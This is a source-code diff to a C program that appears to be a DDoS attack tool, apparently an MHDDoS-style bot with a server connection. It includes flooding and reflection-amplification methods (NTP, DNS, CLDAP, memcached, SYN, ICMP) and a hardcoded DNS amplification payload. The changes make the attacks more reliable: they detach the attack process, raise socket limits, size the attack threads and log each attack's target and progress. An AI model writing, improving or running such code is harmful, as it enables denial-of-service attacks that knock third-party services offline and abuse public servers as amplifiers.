@@ -2,6 +2,7 @@
 #include <stdarg.h>
 #include <sys/utsname.h>
 #include <sys/wait.h>
+#include <sys/resource.h>
 
 #ifndef SERVER_HOST
 #define SERVER_HOST "0.0.0.0"
@@ -167,9 +168,10 @@ static void execute_attack(int argc, char **argv) {
     if (pid < 0) return;
 
     if (pid == 0) {
+        setsid();
         if (g_server_sock >= 0) close(g_server_sock);
         signal(SIGCHLD, SIG_DFL);
-        signal(SIGPIPE, SIG_DFL);
+        signal(SIGPIPE, SIG_IGN);
         run_attack_in_child(argc, argv);
         _exit(0);
     } else {
@@ -179,6 +181,16 @@ static void execute_attack(int argc, char **argv) {
 }
 
 static void run_attack_in_child(int argc, char **argv) {
+    struct rlimit rl;
+    rl.rlim_cur = 65535;
+    rl.rlim_max = 65535;
+    setrlimit(RLIMIT_NOFILE, &rl);
+
+    freopen("/tmp/mhddos_debug.log", "a", stderr);
+    fprintf(stderr, "[CHILD PID %d] Starting attack, argc=%d\n", getpid(), argc);
+    for (int i = 0; i < argc; i++) fprintf(stderr, "  argv[%d] = %s\n", i, argv[i]);
+    fflush(stderr);
+
     srand(time(NULL) ^ getpid());
     get_local_ip(g_local_ip, sizeof(g_local_ip));
 
@@ -277,21 +289,35 @@ static void run_attack_in_child(int argc, char **argv) {
         if (proxies) free(proxies);
 
     } else if (is_layer4(method)) {
-        if (argc < 5) _exit(1);
+        if (argc < 5) {
+            fprintf(stderr, "[CHILD] L4: argc < 5, exiting\n");
+            _exit(1);
+        }
 
         url_t target;
         parse_url(urlraw, &target);
 
         char target_ip[256];
-        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) _exit(1);
+        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) {
+            fprintf(stderr, "[CHILD] Cannot resolve %s\n", target.host);
+            _exit(1);
+        }
 
         int port = target.port;
-        if (port > 65535 || port < 1) _exit(1);
+        if (port > 65535 || port < 1) {
+            fprintf(stderr, "[CHILD] Invalid port %d\n", port);
+            _exit(1);
+        }
 
         if ((method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
              method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
              method == METHOD_ARD || method == METHOD_SYN || method == METHOD_ICMP) &&
-            !check_raw_socket()) _exit(1);
+            !check_raw_socket()) {
+            fprintf(stderr, "[CHILD] Cannot create raw socket (need root)\n");
+            _exit(1);
+        }
+
+        fprintf(stderr, "[CHILD] L4 attack: method=%s target=%s:%d\n", one, target_ip, port);
 
         int threads = atoi(argv[3]);
         int timer = atoi(argv[4]);
@@ -380,6 +406,10 @@ static void run_attack_in_child(int argc, char **argv) {
         pthread_t *tids = malloc(sizeof(pthread_t) * threads);
         layer4_args_t *thread_args = calloc(threads, sizeof(layer4_args_t));
 
+        pthread_attr_t attr;
+        pthread_attr_init(&attr);
+        pthread_attr_setstacksize(&attr, 65536);
+
         for (int i = 0; i < threads; i++) {
             strncpy(thread_args[i].target_ip, target_ip, sizeof(thread_args[i].target_ip));
             thread_args[i].target_port = port;
@@ -418,12 +448,17 @@ static void run_attack_in_child(int argc, char **argv) {
                                0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00};
                 set_amp_payload(&thread_args[i], p, 31, 53);
             }
-            pthread_create(&tids[i], NULL, layer4_thread, &thread_args[i]);
+            if (pthread_create(&tids[i], &attr, layer4_thread, &thread_args[i]) != 0) {
+                fprintf(stderr, "[CHILD] Failed to create thread %d: %s\n", i, strerror(errno));
+            }
         }
+        pthread_attr_destroy(&attr);
 
+        fprintf(stderr, "[CHILD] %d threads created, starting attack for %d seconds\n", threads, timer);
         running = 1;
         time_t ts = time(NULL);
         while (time(NULL) < ts + timer) sleep(1);
+        fprintf(stderr, "[CHILD] Attack finished\n");
         running = 0;
         sleep(1);
         free(thread_args);
